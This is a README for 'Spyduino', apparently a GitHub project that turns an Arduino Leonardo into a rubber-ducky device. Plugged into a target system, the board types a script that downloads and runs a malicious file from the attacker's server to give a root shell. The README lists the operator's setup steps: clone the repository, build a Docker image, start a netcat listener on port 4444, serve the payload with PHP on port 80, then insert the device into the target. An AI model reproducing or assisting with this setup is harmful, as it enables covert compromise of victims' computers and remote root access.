# Spyduino
An example of a rubber ducky with Arduino Leonardo

## Overview

![immagine](./media/Cattura.PNG)



The Arduino Leonardo has been loaded with a malicious program. 

Once the board is inserted into the target system, it is recognized as an HID and performs a malicious script. 

The script performs the downloading and execution of a malicious file from the attacker's server, allowing him to obtain a root shell of the victim.





## install

``` git clone https://github.com/JordanC996/Spyduino.git ```
 
## run

build an image from dockerfile

`docker build . `

run the image

`docker container run -it <id-image>` 

run netcat command

`nc -lvp 4444`

run php server listening on port 80

`php -S 172.17.0.2:80`

load arduino code on arduino Leonardo and get your Spyduino

insert the Spyduino in the target system!
